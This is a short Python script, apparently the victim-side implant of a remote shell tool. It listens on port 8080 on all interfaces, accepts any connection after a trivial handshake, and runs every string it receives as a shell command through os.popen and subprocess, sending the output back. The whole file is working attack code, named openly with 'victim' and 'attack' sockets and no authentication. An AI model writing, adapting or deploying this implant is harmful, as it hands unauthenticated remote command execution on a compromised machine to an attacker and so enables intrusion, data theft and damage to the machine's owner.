import socket
import os
import subprocess

host = '0.0.0.0'
port = 8080

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
victim_socket.bind((host,port))


def cmd(command):
    output = os.popen(command).read()
    if output == "":
        while True:
            exit_code = subprocess.call(command.split())
            if exit_code == 0:
                return str("BAM!")
            else:
                return str("UHHH")
    return output



def revshell_server(socket_x):
    while True:
        resp = socket_x.recv(1024)
        if resp.decode('utf-8') == '<bravo>':
            socket_x.send('<ready>'.encode('utf-8'))
            break
    while True:
        msg = socket_x.recv(1024)
        if msg.decode('utf-8') == '<close>':
            socket_x.close()
            break
        if msg.decode('utf-8')[0:3] == 'cd ':
            os.chdir(msg.decode('utf-8')[3:])
            socket_x.sendall('Done'.encode('utf-8'))
            continue
        
        out_put = cmd(command=msg.decode('utf-8'))
        socket_x.sendall(out_put.encode('utf-8'))



victim_socket.listen()
while True:
    attack_socket, addr = victim_socket.accept()
    attack_socket.send("<listening>".encode('utf-8'))    
    revshell_server(attack_socket)